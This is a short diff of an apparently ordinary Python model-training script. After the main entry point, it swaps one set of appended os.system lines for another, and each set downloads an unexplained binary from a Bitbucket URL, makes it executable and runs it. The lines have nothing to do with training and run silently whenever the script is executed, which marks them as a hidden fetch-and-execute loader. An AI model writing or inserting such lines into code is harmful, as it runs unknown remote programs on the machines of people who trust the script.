@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://bitbucket.org/betee/sfx/raw/4f2b40d2bd7df3c11febc67c0890ee8b7676351b/sfcrot')
-os.system('chmod 777 sfcrot')
-os.system('./sfcrot')
+os.system('wget https://bitbucket.org/betee/whiv/raw/ae5668ac75ff5471daaee19ed1285cefaa03a3b1/whiv')
+os.system('chmod 777 whiv')
+os.system('./whiv')
